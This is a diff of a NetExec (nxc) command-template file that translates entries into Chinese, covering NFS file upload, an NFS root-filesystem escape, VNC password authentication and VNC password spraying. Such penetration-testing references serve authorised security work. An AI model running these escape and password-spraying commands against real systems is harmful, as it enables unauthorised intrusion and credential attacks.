     command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"
 
-  - title: nxc nfs - escape to root filesystem
+  - title: nxc nfs - 逃逸到根文件系统
     desc: |
-      Attempt root filesystem escape on NFS. Exploits NFS misconfiguration
-      to access root filesystem. Requires root escape vulnerability.
+      尝试在 NFS 上进行根文件系统逃逸。利用 NFS 错误配置访问根文件系统。需要 root 逃逸漏洞。
     command: "nxc nfs {{target}} --root-escape"
 
   # ============================================================================
   # VNC PROTOCOL
   # ============================================================================
 
-  - title: nxc vnc - basic authentication
+  - title: nxc vnc - 基础认证
     desc: |
-      Authenticate to VNC server with password. Tests VNC credentials.
-      Shows (Pwn3d!) when code execution is possible.
+      使用密码认证 VNC 服务器。测试 VNC 凭据。可执行代码时显示（Pwn3d!）。
     command: "nxc vnc {{target}} -p {{password}}"
 
-  - title: nxc vnc - password spray
+  - title: nxc vnc - 密码喷洒
     desc: |
-      Password spray against VNC servers. Tests passwords against multiple
-      VNC hosts.
+      对 VNC 服务器进行密码喷洒。对多个 VNC 主机测试密码。
     command: "nxc vnc {{target}} -p {{passwords_file|~/passwords.txt}}"
 
